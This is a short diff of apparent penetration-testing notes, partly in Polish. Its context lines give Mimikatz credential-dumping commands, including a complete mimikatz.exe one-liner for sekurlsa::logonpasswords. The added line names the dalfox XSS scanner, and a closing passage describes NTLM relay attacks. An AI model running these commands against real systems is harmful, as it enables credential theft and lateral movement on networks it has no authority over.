@@ -6,7 +6,7 @@ token::elevate
 lsadump::sam
 mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
 
-
+dalfox - xss scaner
 
 NTLMRELAY.py:Ten moduł wykonuje ataki SMB Relay pierwotnie odkryte przez cDc, rozszerzone na wiele protokołów docelowych (SMB, MSSQL, LDAP itp.). 
 Otrzymuje listę celów i dla każdego odebranego połączenia wybiera następny target i spróbuj przekazać poświadczenia. Ponadto, jeśli określono,
